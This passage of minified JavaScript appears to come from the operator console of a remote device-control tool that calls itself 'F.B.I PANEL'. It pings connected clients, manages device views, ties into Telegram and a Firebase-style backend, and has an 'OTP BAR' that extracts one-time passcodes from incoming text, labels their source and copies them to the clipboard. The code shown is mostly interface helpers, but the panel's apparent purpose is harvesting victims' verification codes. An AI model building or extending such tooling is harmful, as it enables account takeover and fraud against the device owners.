      if(i%50===0||i===allClients.length-1){var s=document.getElementById('pingStats');if(s)s.textContent=_pingReplied+'/'+_pingTotal;_pingUpdateBtn();await new Promise(function(r){setTimeout(r,0);});}
    }
  }catch(e){}
  _pingUpdateBtn();renderGrid(true);renderStats();
  if(_apOn)_pingTmr=setTimeout(_apLoop,3000);
}

/* ═══════ OTP BAR ═══════ */
var _lastOtp='';
function _extractOtp(txt){var m=txt.match(/\b(\d{6})\b/)||txt.match(/\b(\d{4,8})\b/);return m?m[1]:null;}
function otpShow(otp,src){_lastOtp=otp;document.getElementById('otpNum').textContent=otp;document.getElementById('otpSrc').textContent='From: '+src;document.getElementById('otpBar').classList.add('show');if(navigator.clipboard)navigator.clipboard.writeText(otp).catch(function(){});}
function otpCopy(){var v=document.getElementById('otpNum').textContent;if(!v||v.includes('─'))return;navigator.clipboard&&navigator.clipboard.writeText(v).then(function(){toast('✓ OTP copied');});}
function otpDismiss(){document.getElementById('otpBar').classList.remove('show');}

/* ═══════ HELPERS ═══════ */
function openM(id){document.getElementById(id).classList.add('open');}
function closeM(id){document.getElementById(id).classList.remove('open');if(id==='deviceModal'){selDev=null;stopMP();}}
document.querySelectorAll('.overlay').forEach(function(o){o.addEventListener('click',function(e){if(e.target===o){o.classList.remove('open');if(o.id==='deviceModal'){selDev=null;stopMP();}}});});
function toast(msg){var t=document.getElementById('toastEl');t.textContent=msg;t.classList.add('show');setTimeout(function(){t.classList.remove('show');},2000);}
function esc(s){return String(s==null?'':s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');}
function clip(t,btn){if(navigator.clipboard){navigator.clipboard.writeText(t).then(function(){if(btn){btn.textContent='✓';setTimeout(function(){btn.textContent='Copy';},1200);}});}}
function copyFromEl(el,ev){
  if(ev)ev.stopPropagation();
  var txt=el.getAttribute('data-copy')||el.textContent||'';txt=String(txt).trim();
  if(!txt||txt==='—')return;
  var doCopy=function(){toast('📋 '+txt.substring(0,32)+(txt.length>32?'…':''));};
  if(navigator.clipboard){navigator.clipboard.writeText(txt).then(doCopy).catch(function(){var ta=document.createElement('textarea');ta.value=txt;document.body.appendChild(ta);ta.select();try{document.execCommand('copy');doCopy();}catch(e){}ta.remove();});}
  else{var ta=document.createElement('textarea');ta.value=txt;document.body.appendChild(ta);ta.select();try{document.execCommand('copy');doCopy();}catch(e){}ta.remove();}
}
function catClick(){toast('😸 Meow!');}
function rippleClick(e){var btn=e.currentTarget;var r=document.createElement('span');r.className='rip';var rect=btn.getBoundingClientRect();r.style.left=(e.clientX-rect.left-45)+'px';r.style.top=(e.clientY-rect.top-45)+'px';btn.appendChild(r);setTimeout(function(){r.remove();},600);}
document.addEventListener('keydown',function(e){if(e.key==='Escape')document.querySelectorAll('.overlay.open').forEach(function(o){o.classList.remove('open');});if(e.key==='Enter'&&document.getElementById('setup').style.display!=='none')connect();});

try{activeDeviceUid=localStorage.getItem(CFG.LS_ACTIVE||'fbi_active_device');}catch(e){}
setTimeout(function(){updateTgBtn();},300);
setInterval(function(){if(document.getElementById('settingsModal')&&document.getElementById('settingsModal').classList.contains('open'))updateTgStatusLine();},2000);

/* 🆕 Save session every 5s */
setInterval(function(){if(FB_URL)savePanelSession();},5000);

console.log('%c[F.B.I PANEL] v11.0 — Redis · Users · Force Join · No-Blink ⚡','color:#a855f7;font-weight:bold;font-size:14px');
